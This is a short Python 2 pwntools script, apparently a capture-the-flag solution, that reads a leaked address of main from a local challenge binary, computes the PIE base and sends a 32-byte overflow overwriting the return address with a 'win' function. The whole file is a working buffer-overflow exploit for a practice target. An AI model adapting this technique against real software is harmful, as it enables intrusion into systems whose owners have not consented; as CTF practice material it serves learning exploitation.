#!/usr/bin/python2

from pwn import *

p = process('./chall')
binary = ELF('./chall')

p.recvuntil('at: ')
leak = int(p.recvline(),16)
print(hex(leak))

main = p32(binary.address)
print(main)
binary.address = leak - binary.sym['main']
print(hex(binary.address))

payload = 'A' * 32
payload += p32(binary.sym['win'])

p.sendline(payload)
p.interactive()
